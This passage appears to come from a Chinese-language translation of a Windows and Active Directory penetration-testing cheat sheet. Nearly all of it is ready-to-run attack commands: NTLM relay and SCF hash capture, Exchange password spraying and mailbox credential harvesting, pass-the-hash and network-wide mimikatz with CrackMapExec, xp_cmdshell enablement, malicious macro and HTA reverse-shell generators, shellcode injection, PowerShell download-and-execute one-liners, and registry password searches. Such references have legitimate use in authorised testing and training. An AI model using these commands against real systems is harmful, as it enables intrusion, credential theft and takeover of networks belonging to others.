-i</span><br><span class="line"></span><br><span class="line">-i opens an interactive shell.</span><br><span class="line"></span><br><span class="line">Shout out to hausec for this super nice tip.</span><br></pre></td></tr></table></figure>

<h2 id="3-4-SCF文件攻击"><a href="#3-4-SCF文件攻击" class="headerlink" title="3.4 SCF文件攻击"></a>3.4 SCF文件攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Create .scf file and drop inside SMB Share and fire up Responder ;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Filename = @m0chan.scf</span><br><span class="line"></span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.2\Share\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>

<h2 id="3-5-NTLM-Relay"><a href="#3-5-NTLM-Relay" class="headerlink" title="3.5 NTLM-Relay"></a>3.5 NTLM-Relay</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Good article explaining differences between NTLM/Net-NTLMV1&amp;V2</span><br><span class="line"></span><br><span class="line">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</span><br><span class="line"></span><br><span class="line">TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.</span><br><span class="line"></span><br><span class="line">You CAN perform Pass-The-Hash attacks with NTLM hashes.</span><br><span class="line">You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.</span><br><span class="line"></span><br><span class="line">PS: You CANNOT relay a hash back to itself.</span><br><span class="line">PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt</span><br><span class="line"></span><br><span class="line">This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.</span><br><span class="line"></span><br><span class="line">python Responder.py -I &lt;interface&gt; -r -d -w</span><br><span class="line">ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)</span><br><span class="line"></span><br><span class="line">How about we execute a command instead.</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd</span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP</span><br></pre></td></tr></table></figure>

<h2 id="3-6-私下交易"><a href="#3-6-私下交易" class="headerlink" title="3.6 私下交易"></a>3.6 私下交易</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</span><br><span class="line"></span><br><span class="line">Combine privxchange.py and ntlmrelayx</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE</span><br><span class="line"></span><br><span class="line">python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local</span><br></pre></td></tr></table></figure>

<h2 id="3-7-Exchange-Password-Spray"><a href="#3-7-Exchange-Password-Spray" class="headerlink" title="3.7 Exchange Password Spray"></a>3.7 Exchange Password Spray</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#https://github.com/sensepost/ruler</span><br><span class="line"></span><br><span class="line">./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v</span><br></pre></td></tr></table></figure>

<h2 id="3-8-ExchangeRelayX"><a href="#3-8-ExchangeRelayX" class="headerlink" title="3.8 ExchangeRelayX"></a>3.8 ExchangeRelayX</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/quickbreach/ExchangeRelayX</span><br><span class="line"></span><br><span class="line">An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./exchangeRelayx.py -t https://mail.quickbreach.com</span><br></pre></td></tr></table></figure>

<h2 id="3-9-Exchange-Mailbox-Post-Compromise"><a href="#3-9-Exchange-Mailbox-Post-Compromise" class="headerlink" title="3.9 Exchange Mailbox Post-Compromise"></a>3.9 Exchange Mailbox Post-Compromise</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Enumerate GlobalAddressList</span><br><span class="line"></span><br><span class="line">Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019</span><br><span class="line"></span><br><span class="line">Enumerate AD Usernames</span><br><span class="line"></span><br><span class="line">Get-ADUsernameFromEWS -Emaillist .\users.txt</span><br><span class="line"></span><br><span class="line">Enumerate Mailbox Folders</span><br><span class="line"></span><br><span class="line">Get-MailboxFolders -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials Stored in Emails</span><br><span class="line"></span><br><span class="line">Invoke-SelfSearch -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin</span><br><span class="line"></span><br><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012</span><br></pre></td></tr></table></figure>

<h2 id="3-10-CrackMapExec"><a href="#3-10-CrackMapExec" class="headerlink" title="3.10 CrackMapExec"></a>3.10 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CrackMapExec is installed on Kali or get Windows Binary from Github.</span><br><span class="line"></span><br><span class="line">Has 3 Execution Methods</span><br><span class="line">crackmapexec smb &lt;- Creating and Running a Service over SMB</span><br><span class="line">crackmapexec wmi &lt;- Executes command over WMI</span><br><span class="line">crackmapexec at &lt;- Schedules Task with Task Scheduler</span><br><span class="line"></span><br><span class="line">Can execute plain commands with -X flag i/e </span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 -x whoami</span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 &lt;- Host Discovery</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; </span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --pass-pol</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --shares</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can also PTH with CME</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e</span><br><span class="line"></span><br><span class="line">cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS</span><br><span class="line"></span><br><span class="line">Dump Local SAM hashes</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth --sam</span><br><span class="line"></span><br><span class="line">Running Mimikatz </span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M mimikatz</span><br><span class="line"></span><br><span class="line">^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin</span><br><span class="line"></span><br><span class="line">Enum AV Products</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M enum_avproducts</span><br></pre></td></tr></table></figure>

<h2 id="3-11-邮件狙击手"><a href="#3-11-邮件狙击手" class="headerlink" title="3.11 邮件狙击手"></a>3.11 邮件狙击手</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019</span><br><span class="line"></span><br><span class="line">[*] Now spraying the OWA portal at https://m0chanAD.local/owa/</span><br><span class="line"></span><br><span class="line">[*] SUCCESS! User:m0chan:Summer2019</span><br><span class="line"></span><br><span class="line">Lmao, you really think Id use the pass Summer2019?</span><br></pre></td></tr></table></figure>

<h2 id="3-12-Kerberos-Stuff"><a href="#3-12-Kerberos-Stuff" class="headerlink" title="3.12 Kerberos Stuff"></a>3.12 Kerberos Stuff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br></pre></td></tr></table></figure>

<h2 id="3-13-MSSQL利用（PowerUpSQL）"><a href="#3-13-MSSQL利用（PowerUpSQL）" class="headerlink" title="3.13 MSSQL利用（PowerUpSQL）"></a>3.13 MSSQL利用（PowerUpSQL）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/NetSPI/PowerUpSQL</span><br><span class="line"></span><br><span class="line">#View SQL Instances</span><br><span class="line">Get-SQLInstanceDomain [| Get-SQLServerInfo]</span><br><span class="line"></span><br><span class="line">#Login in with Domain Account</span><br><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line"></span><br><span class="line">#Login in with Default Password</span><br><span class="line">Get-SQLServerDefaultLoginPw</span><br><span class="line"></span><br><span class="line">#List DB, Tables &amp; Columns</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLDatabase</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;</span><br><span class="line"></span><br><span class="line">#Search Column Names for Word</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10</span><br><span class="line"></span><br><span class="line">#Try to Execute Commands (RCE)</span><br><span class="line"></span><br><span class="line">Invoke-SQLOSCmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Enable XP_CMDShell Process</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">xp_cmdshell &apos;&lt;cmd&gt;&apos;</span><br><span class="line">go</span><br></pre></td></tr></table></figure>

<h2 id="3-14-Malicious-Macro-with-MSBuild"><a href="#3-14-Malicious-Macro-with-MSBuild" class="headerlink" title="3.14 Malicious Macro with MSBuild"></a>3.14 Malicious Macro with MSBuild</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/MaliciousMacroMSBuild</span><br><span class="line"></span><br><span class="line">#https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild Explained</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a PowerShell MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Custom MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Kill Date</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Environmental Keying</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github</span><br></pre></td></tr></table></figure>

<h2 id="3-15-WeirdHTA-Undetectable-HTA"><a href="#3-15-WeirdHTA-Undetectable-HTA" class="headerlink" title="3.15 WeirdHTA - Undetectable HTA"></a>3.15 WeirdHTA - Undetectable HTA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/felamos/weirdhta</span><br><span class="line"></span><br><span class="line">python3 --help</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --command &apos;c:\windows\system32\cmd.exe&apos; (custom command)</span><br></pre></td></tr></table></figure>

<h2 id="3-16-EvilWinRM"><a href="#3-16-EvilWinRM" class="headerlink" title="3.16 EvilWinRM"></a>3.16 EvilWinRM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Hackplayers/evil-winrm</span><br><span class="line"></span><br><span class="line">Ultimate Shell for WinRM Connections</span><br><span class="line"></span><br><span class="line">Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]</span><br><span class="line">    -S, --ssl                        Enable SSL</span><br><span class="line">    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate</span><br><span class="line">    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path</span><br><span class="line">    -e, --executables EXES_PATH      C# executables local path</span><br><span class="line">    -i, --ip IP                      Remote host IP or hostname (required)</span><br><span class="line">    -U, --url URL                    Remote url endpoint (default /wsman)</span><br><span class="line">    -u, --user USER                  Username (required)</span><br><span class="line">    -p, --password PASS              Password</span><br><span class="line">    -P, --port PORT                  Remote host port (default 5985)</span><br><span class="line">    -V, --version                    Show version</span><br><span class="line">    -h, --help                       Display this help message</span><br></pre></td></tr></table></figure>

<p>3.17 GetVulnerableGPO</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gpoguy/GetVulnerableGPO</span><br><span class="line"></span><br><span class="line">PowerShell script to find &apos;vulnerable&apos; security-related GPOs that should be hardened (for more background, see the GPO discoverability section of this blog: https://sdmsoftware.com/group-policy-blog/security-related/security-fun-bloodhound-ms16-072-gpo-discoverability/) Requires GPMC &amp; SDM Software GPMC PowerShell Module (used to more easily parse GP settings during the search): https://s3.amazonaws.com/sdmsoftware.com/dl/SDM-GPMC-Module2.0Setup.zip</span><br></pre></td></tr></table></figure>

<p>3.18 Invoke-PSImage</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/peewpw/Invoke-PSImage</span><br><span class="line"></span><br><span class="line">Encodes a PowerShell script in the pixels of a PNG file and generates a oneliner to execute</span><br><span class="line"></span><br><span class="line">Invoke-PSImage takes a PowerShell script and encodes the bytes of the script into the pixels of a PNG image. It generates a oneliner for executing either from a file of from the web.</span><br><span class="line"></span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg</span><br><span class="line">   [Oneliner to execute from a file]</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">PS&gt;Import-Module .\Invoke-PSImage.ps1</span><br><span class="line">PS&gt;Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg -WebRequest</span><br><span class="line">   [Oneliner to execute from the web]</span><br></pre></td></tr></table></figure>

<h2 id="3-17-Meterpreter-Donut-Shellcode注入-NET"><a href="#3-17-Meterpreter-Donut-Shellcode注入-NET" class="headerlink" title="3.17 Meterpreter + Donut-Shellcode注入.NET"></a>3.17 Meterpreter + Donut-Shellcode注入.NET</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html</span><br><span class="line"></span><br><span class="line">A module for executing arbitrary shellcode within Meterpreter aka executing Mimikatz in-memory, reflectively and interactively!</span><br><span class="line"></span><br><span class="line">donut -f /tmp/mimikatz.exe -a 2 -o /tmp/payload.bin</span><br><span class="line"></span><br><span class="line">use post/windows/manage/shellcode_inject</span><br><span class="line">set SHELLCODE /tmp/payload.bin</span><br><span class="line">set SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<h1 id="0x04-特权提升"><a href="#0x04-特权提升" class="headerlink" title="0x04 特权提升"></a>0x04 特权提升</h1><blockquote>
<p>参考：<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></p>
<p>运行此脚本：<a href="https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat" target="_blank" rel="noopener">https://github.com/M4ximuss/Powerless/blob/master/Powerless.bat</a></p>
</blockquote>
<h2 id="4-1-基本命令"><a href="#4-1-基本命令" class="headerlink" title="4.1 基本命令"></a>4.1 基本命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe</span><br><span class="line">net users</span><br><span class="line">hostname</span><br><span class="line">whoami</span><br><span class="line">net localgroups</span><br><span class="line">echo %logonserver%</span><br><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netstat -an</span><br><span class="line">type C:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<h2 id="4-2-PowerUp-ps1（有时是快速获胜）"><a href="#4-2-PowerUp-ps1（有时是快速获胜）" class="headerlink" title="4.2 PowerUp.ps1（有时是快速获胜）"></a>4.2 PowerUp.ps1（有时是快速获胜）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe /c IEX(New-Object Net.WebClient).downloadString(&apos;webserver/PowerUp.ps1&apos;) ;Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<h2 id="4-3-锐化"><a href="#4-3-锐化" class="headerlink" title="4.3 锐化"></a>4.3 锐化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/GhostPack/SharpUp</span><br><span class="line"></span><br><span class="line">C Sharp Implementation of PowerUp.ps1 which can be reflectively loaded.</span><br></pre></td></tr></table></figure>

<h2 id="4-4-如果是公元，引进猎狗犬…"><a href="#4-4-如果是公元，引进猎狗犬…" class="headerlink" title="4.4  如果是公元，引进猎狗犬…"></a>4.4  如果是公元，引进猎狗犬…</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.ps1</span><br><span class="line">SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHound</span><br><span class="line"></span><br><span class="line">IEX(System.Net.WebClient.DownloadString(&apos;http://webserver:4444/SharpHound.ps1&apos;))</span><br><span class="line"></span><br><span class="line">Invoke-CollectionMethod All</span><br><span class="line"></span><br><span class="line">Import .zip to Bloodhound</span><br><span class="line"></span><br><span class="line">If you can&apos;t exfil the .zip... Find a way ;) I joke, I joke. Output as plain json and copy over manually. It&apos;s a big big pain but it works.</span><br></pre></td></tr></table></figure>

<h2 id="4-5-Bloodhound-Python"><a href="#4-5-Bloodhound-Python" class="headerlink" title="4.5 Bloodhound-Python"></a>4.5 Bloodhound-Python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/fox-it/BloodHound.py.git</span><br><span class="line">cd BloodHound.py/ &amp;&amp; pip install .</span><br><span class="line"></span><br><span class="line">bloodhound-python -d m0chanAD.local -u m0chan -p Summer2019 -gc DOMAINCONTROLLER.m0chanAD.local -c all</span><br></pre></td></tr></table></figure>

<h2 id="4-6-明文密码"><a href="#4-6-明文密码" class="headerlink" title="4.6 明文密码"></a>4.6 明文密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Windows autologin</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line"># VNC</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"></span><br><span class="line"># SNMP Parameters</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line"></span><br><span class="line"># Putty</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"></span><br><span class="line"># Search for password in registry</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>

<h2 id="4-7-查看已安装的软件"><a href="#4-7-查看已安装的软件" class="headerlink" title="4.7 查看已安装的软件"></a>4.7 查看已安装的软件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tasklist /SVC</span><br><span class="line">net start</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line">DRIVERQUERY</span><br><span class="line"></span><br><span class="line">dir /a &quot;C:\Program Files&quot;</span><br><span class="line">dir /a &quot;C:\Program Files (x86)&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE</span><br><span class="line"></span><br><span class="line">Get-ChildItem &apos;C:\Program Files&apos;, &apos;C:\Program Files (x86)&apos; | ft Parent,Name,LastWriteTime</span><br><span class="line"></span><br><span class="line">Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name</span><br></pre></td></tr></table></figure>

